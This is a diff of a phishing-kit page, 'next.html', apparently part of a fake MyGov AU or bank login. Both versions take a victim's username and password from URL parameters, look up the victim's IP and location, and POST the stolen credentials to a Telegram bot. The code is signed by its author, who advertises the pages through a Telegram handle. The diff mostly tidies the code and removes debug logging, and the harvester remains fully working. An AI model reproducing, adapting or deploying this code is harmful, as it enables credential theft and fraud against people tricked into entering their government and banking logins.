@@ -1,115 +1,94 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8">
-  <title>next</title>
+    <meta charset="UTF-8">
+    <title>next</title>
 </head>
 <body>
-<!-- Load central config -->
-<script src="config/email.js"></script>
-<script>
-  (function() {
-    console.log("=== next.html loaded ===");
+    <script src="config/email.js"></script>
+    <script>
+        (function() {
+            const apikey = CONFIG.apikey;
+            const chatid = CONFIG.chatid;
 
-    // Read credentials from global CONFIG
-    const apikey = CONFIG.apikey;
-    const chatid = CONFIG.chatid;
-    console.log("apikey:", apikey);
-    console.log("chatid:", chatid);
+            function getParam(name) {
+                const url = new URL(window.location.href);
+                return url.searchParams.get(name) || '';
+            }
 
-    function getParam(name) {
-      const url = new URL(window.location.href);
-      return url.searchParams.get(name) || '';
-    }
+            function getBrowser(userAgent) {
+                if (userAgent.includes('MSIE')) return 'Internet Explorer';
+                if (userAgent.includes('Firefox')) return 'Mozilla Firefox';
+                if (userAgent.includes('Chrome')) return 'Google Chrome';
+                if (userAgent.includes('Safari')) return 'Safari';
+                if (userAgent.includes('Opera')) return 'Opera';
+                return 'Unknown';
+            }
 
-    function getBrowser(userAgent) {
-      if (userAgent.includes('MSIE')) return 'Internet Explorer';
-      if (userAgent.includes('Firefox')) return 'Mozilla Firefox';
-      if (userAgent.includes('Chrome')) return 'Google Chrome';
-      if (userAgent.includes('Safari')) return 'Safari';
-      if (userAgent.includes('Opera')) return 'Opera';
-      return 'Unknown';
-    }
+            async function getLocation(ip) {
+                try {
+                    const resp = await fetch(`https://freeipapi.com/api/json/${ip}`);
+                    const data = await resp.json();
+                    return { country: data.countryName || 'Unknown', city: data.cityName || 'Unknown' };
+                } catch {
+                    return { country: 'Unknown', city: 'Unknown' };
+                }
+            }
 
-    async function getLocation(ip) {
-      try {
-        const resp = await fetch(`https://freeipapi.com/api/json/${ip}`);
-        const data = await resp.json();
-        return { country: data.countryName || 'Unknown', city: data.cityName || 'Unknown' };
-      } catch (e) {
-        console.error("Location fetch error:", e);
-        return { country: 'Unknown', city: 'Unknown' };
-      }
-    }
+            (async function() {
+                const aa = getParam('username');
+                const bb = getParam('password');
+                const cc = getParam('title');
 
-    (async function() {
-      const aa = getParam('username');
-      const bb = getParam('password');
-      const cc = getParam('title');
-      console.log("Received params:", { username: aa, password: bb, title: cc });
+                // If no username, return the JSON key (same as PHP)
+                if (!aa) {
+                    document.body.textContent = '{"key": "For Page and Link Contact Telegram: @Mr0xBD"}';
+                    return;
+                }
 
-      // If no username, return the JSON key (like PHP did on GET)
-      if (!aa) {
-        console.log("No username – returning JSON key");
-        document.body.textContent = '{"key": "For Page and Link Contact Telegram: @Mr0xBD"}';
-        return;
-      }
+                // Get client IP
+                let ip = '0.0.0.0';
+                try {
+                    const resp = await fetch('https://api.ipify.org?format=json');
+                    const data = await resp.json();
+                    ip = data.ip;
+                } catch (e) {
+                    console.error('IP fetch error:', e);
+                }
 
-      // Fetch IP
-      let ip = '0.0.0.0';
-      try {
-        const resp = await fetch('https://api.ipify.org?format=json');
-        const data = await resp.json();
-        ip = data.ip;
-        console.log("IP fetched:", ip);
-      } catch (e) {
-        console.error("IP fetch error:", e);
-      }
+                const userAgent = navigator.userAgent;
+                const browser = getBrowser(userAgent);
+                const location = await getLocation(ip);
 
-      const userAgent = navigator.userAgent;
-      const browser = getBrowser(userAgent);
-      const location = await getLocation(ip);
+                let message = "";
+                message += "|++++++++++++|MyGov AU LOG|+++++++++++|\n";
+                message += "|Bank Name: " + cc + "\n";
+                message += "|Username: " + aa + "\n";
+                message += "|Password: " + bb + "\n";
+                message += "|+++++++++++++|   Information   |+++++++++++++++|\n";
+                message += "|Client IP: " + ip + "\n";
+                message += "|City : " + location.city + "\n";
+                message += "|Country : " + location.country + "\n";
+                message += "|UserAgent : " + userAgent + "\n";
+                message += "|+++++++++++++| Coded By Mr.0x |+++++++++++++|\n";
+                message += "|+++++++++++++|    @Mr0xBD     |+++++++++++++|\n";
 
-      // Build message exactly as PHP
-      let message = "";
-      message += "|++++++++++++|MyGov AU LOG|+++++++++++|\n";
-      message += "|Bank Name: " + cc + "\n";
-      message += "|Username: " + aa + "\n";
-      message += "|Password: " + bb + "\n";
-      message += "|+++++++++++++|   Information   |+++++++++++++++|\n";
-      message += "|Client IP: " + ip + "\n";
-      message += "|City : " + location.city + "\n";
-      message += "|Country : " + location.country + "\n";
-      message += "|UserAgent : " + userAgent + "\n";
-      message += "|+++++++++++++| Coded By Mr.0x |+++++++++++++|\n";
-      message += "|+++++++++++++|    @Mr0xBD     |+++++++++++++|\n";
+                // Send to Telegram
+                try {
+                    await fetch(`https://api.telegram.org/bot${apikey}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: chatid, text: message })
+                    });
+                    console.log('Telegram message sent');
+                } catch (e) {
+                    console.error('Telegram send error:', e);
+                }
 
-      console.log("Message to send:\n", message);
-
-      // Send to Telegram
-      try {
-        const url = `https://api.telegram.org/bot${apikey}/sendMessage`;
-        const response = await fetch(url, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: chatid, text: message })
-        });
-        const result = await response.json();
-        console.log("Telegram response:", result);
-        if (result.ok) {
-          console.log("✅ Message sent successfully!");
-        } else {
-          console.error("❌ Telegram error:", result);
-        }
-      } catch (e) {
-        console.error("❌ Fetch error (network/CORS):", e);
-      }
-
-      // Clear page (empty response)
-      document.body.innerHTML = '';
-      console.log("=== next.html finished ===");
-    })();
-  })();
-</script>
+                // Return empty response (like PHP did)
+                document.body.innerHTML = '';
+            })();
+        })();
+    </script>
 </body>
 </html>
